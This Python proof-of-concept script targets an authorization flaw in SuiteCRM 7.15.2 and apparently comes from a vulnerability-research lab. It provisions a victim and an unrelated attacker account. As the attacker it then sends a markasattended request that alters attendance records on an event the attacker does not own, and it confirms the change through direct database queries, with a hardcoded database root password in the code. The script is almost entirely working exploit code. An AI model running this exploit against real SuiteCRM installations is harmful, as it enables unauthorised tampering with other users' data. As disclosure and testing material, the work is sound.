#!/usr/bin/env python3
"""
VULN-030 -- FP_events: systemic missing ACL on event actions
            (attendance tamper / no per-record check)

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     modules/FP_events/controller.php:84-101 (action_markasattended) --
          builds a raw UPDATE against fp_events_contacts_c keyed only on the
          caller-supplied event_id/contact id. No ACLAccess, checkAccess,
          is_admin, or assigned_user_id comparison anywhere in the method (or
          any of its seven action_markas*/add_to_list/sendinvitemails
          siblings).

What this script does
----------------------
1. Logs in as admin, creates two fresh, UNRELATED low-priv users: victim V
   (event organiser) and attacker A (a user with no relation to V's event).
2. As V: creates an FP_events event and a Contact, then relates the Contact
   to the event via Save2 (module=FP_events, subpanel_field_name=
   fp_events_contacts) -- this is the legitimate app flow for adding a
   delegate; the relationship row is created with the default invite_status
   'Not Invited' (fp_events_contacts_c schema default).
3. Confirms via the DB that the delegate's invite_status is 'Not Invited'
   before the attack -- this is YOUR OWN seeded event/contact/relationship,
   never demo data.
4. As A (zero relation to V's event or its delegates): POSTs
   action=markasattended with V's event_id and the delegate's contact id.
5. Asserts the REAL effect: the fp_events_contacts_c row's invite_status
   flipped from 'Not Invited' to 'Attended' in the database, caused by a
   user who organises nothing about this event and was never granted edit
   rights on it.

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL, ADMIN_USER, ADMIN_PASS, COMPOSE_PROJECT

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login)

VULN_ID = "VULN-030"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")


def save_evidence(request_txt, response_obj):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:10000])


def db_query(sql):
    r = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e", sql],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout.strip()


def get_record_id(resp):
    m = re.search(r"record=([0-9a-fA-F-]{36})", resp.headers.get("Location", ""))
    return m.group(1) if m else None


def main():
    banner(VULN_ID, "FP_events markasattended -- tamper attendance on an event you don't own")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "provisioning victim/organiser (V) and attacker (A) -- fresh, unrelated low-priv users")
    victim = create_user(admin, "Victim030@2026x!")
    attacker = create_user(admin, "Attacker030@2026x!")
    log("INFO", f"victim(organiser) = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker          = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])
    as_ = web_login(attacker["user_name"], attacker["password"])

    log("SETUP", "as V: create an FP_events event")
    event_name = rand("V030Event")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "FP_events", "action": "Save", "record": "",
        "name": event_name, "duration_hours": "1", "duration_minutes": "0",
        "date_start": "09/28/2026 10:00am", "date_end": "09/28/2026 11:00am",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=FP_events&action=EditView"},
        allow_redirects=False, timeout=30)
    event_id = get_record_id(r)
    if not event_id:
        verdict(VULN_ID, "FAILED", f"could not create victim's FP_events event (status={r.status_code}, "
                                    f"Location={r.headers.get('Location')!r})")
        sys.exit(1)
    log("OK", f"Event created: {event_id} ({event_name}), owned by V")

    log("SETUP", "as V: create a Contact (the delegate)")
    contact_last = rand("V030Delegate")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Contacts", "action": "Save", "record": "",
        "first_name": "Delegate030", "last_name": contact_last,
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Contacts&action=EditView"},
        allow_redirects=False, timeout=30)
    contact_id = get_record_id(r)
    if not contact_id:
        verdict(VULN_ID, "FAILED", f"could not create delegate Contact (status={r.status_code})")
        sys.exit(1)
    log("OK", f"Delegate Contact created: {contact_id} (last_name={contact_last}), owned by V")

    log("SETUP", "as V: relate the delegate Contact to the event via Save2 (legitimate app flow)")
    r = vs.post(f"{BASE_URL}/index.php", params={"module": "FP_events", "action": "Save2"}, data={
        "record": event_id, "subpanel_field_name": "fp_events_contacts", "subpanel_id": contact_id,
        "subpanel_module_name": "Contacts", "refresh_page": "1",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=FP_events&action=DetailView&record={event_id}"},
        timeout=30)
    log("INFO", f"Save2 relate response status={r.status_code}")

    log("STEP", "confirm the delegate relationship row exists with the default invite_status before the attack")
    before = db_query(
        f"SELECT invite_status FROM fp_events_contacts_c WHERE fp_events_contactsfp_events_ida='{event_id}' "
        f"AND fp_events_contactscontacts_idb='{contact_id}' AND deleted=0;"
    )
    log("INFO", f"invite_status BEFORE attack: {before!r}")
    if not before:
        verdict(VULN_ID, "FAILED", "delegate relationship row not found before attack -- setup failed")
        sys.exit(1)

    log("STEP", "as A (zero relation to V's event or its delegates): markasattended on V's event")
    params = {"module": "FP_events", "action": "markasattended"}
    body = {"event_id": event_id, "id": contact_id, "entire_list": "0"}
    request_txt = (
        f"POST /index.php?module=FP_events&action=markasattended HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<attacker session>\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Referer: {BASE_URL}/index.php?module=FP_events&action=DetailView&record={event_id}\n\n"
        f"event_id={event_id}&id={contact_id}&entire_list=0\n"
        f"\n# Attacker A ({attacker['user_name']}) is not the organiser, not a delegate,\n"
        f"# and has no ACL/ownership relation to event {event_id} (owned by V).\n"
    )
    r2 = as_.post(f"{BASE_URL}/index.php", params=params, data=body, timeout=30,
                   headers={"Referer": f"{BASE_URL}/index.php?module=FP_events&action=DetailView&record={event_id}"})
    save_evidence(request_txt, r2)
    log("INFO", f"attack response status={r2.status_code} len={len(r2.text)}")

    log("PROOF", "re-querying fp_events_contacts_c row AFTER the attacker's markasattended")
    after = db_query(
        f"SELECT invite_status FROM fp_events_contacts_c WHERE fp_events_contactsfp_events_ida='{event_id}' "
        f"AND fp_events_contactscontacts_idb='{contact_id}' AND deleted=0;"
    )
    with open(os.path.join(HERE, "evidence", "db_before_after.txt"), "w") as f:
        f.write(f"event_id={event_id} (owned by V={victim['id']})\ncontact_id={contact_id}\n\n"
                f"invite_status BEFORE attacker's request: {before}\ninvite_status AFTER:  {after}\n")
    log("PROOF", f"invite_status AFTER attack: {after!r}")

    tampered = (before != after) and after == "Attended"
    if not tampered:
        verdict(VULN_ID, "FAILED", f"invite_status did not flip to Attended (before={before!r} after={after!r})")
        sys.exit(1)

    log("OK", f"attacker A (no ACL, not the organiser) flipped delegate invite_status "
              f"'{before}' -> '{after}' on V's event via markasattended")
    verdict(VULN_ID, "CONFIRMED",
            f"non-owner A tampered attendance on V's FP_events event {event_id}, invite_status {before}->{after}")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
